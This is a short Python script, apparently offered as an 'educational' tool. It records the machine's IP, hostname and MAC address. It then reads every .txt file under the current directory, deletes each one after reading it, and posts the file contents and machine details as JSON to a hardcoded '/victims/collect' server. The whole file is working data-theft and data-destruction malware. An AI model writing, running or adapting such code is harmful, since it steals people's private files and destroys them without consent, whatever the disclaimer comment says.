import os
import re

import requests

#this script is for educational purposes only, i use it to na7wi pceya 


#file controller : 
def getCurrentDir():
    return os.getcwd()

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)

    textOnly = [f for f in allFiles if f.endswith('.txt')]


    return textOnly

def readFile(filePath):
    with open(filePath, 'r') as file:
        data = file.read()
    return data

def deleteFile(filePath):
    os.remove(filePath)



#computer info controller 
MAC_REGEX = re.compile(r"([0-9A-Fa-f]{2}(?:[-:][0-9A-Fa-f]{2}){5})")


def getNetworkIpWindows():
    output = os.popen("ipconfig").read()

    for line in output.splitlines():
        if "IPv4" in line:
            return line.split(":", 1)[1].strip()

    return ""


def getComputerNameWindows():
    data = os.popen("hostname").read()
    return data.strip()


def getAnyMacAddressWindows():
    output = os.popen("getmac").read()
    for line in output.splitlines():
        match = MAC_REGEX.search(line)
        if match:
            return match.group(1)

    return ""


def computerHostData():
    return {
        "ip": getNetworkIpWindows(),
        "computer_name": getComputerNameWindows(),
        "mac_address": getAnyMacAddressWindows()
    }




if __name__ == "__main__":
    
    computerData = computerHostData()

    #collect the data in files 
    currentDir = getCurrentDir()
    listOfFiles = getListOfFiles(currentDir)

    fileContent = []
   
    for file in listOfFiles:
        data = readFile(file)
        print(f"Data from {file}:\n{data}\n")
        fileContent.append({
            "name": os.path.basename(file),
            "path": file,
            "content": data
        })

    
        #delete the file after reading it
        deleteFile(file)
    
    computerData["files"] = fileContent
    #send the data to the server
    try :

        response = requests.post("http://10.74.0.250:8000/victims/collect", json=computerData)
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error sending data to server: {e}")

    print(computerData)
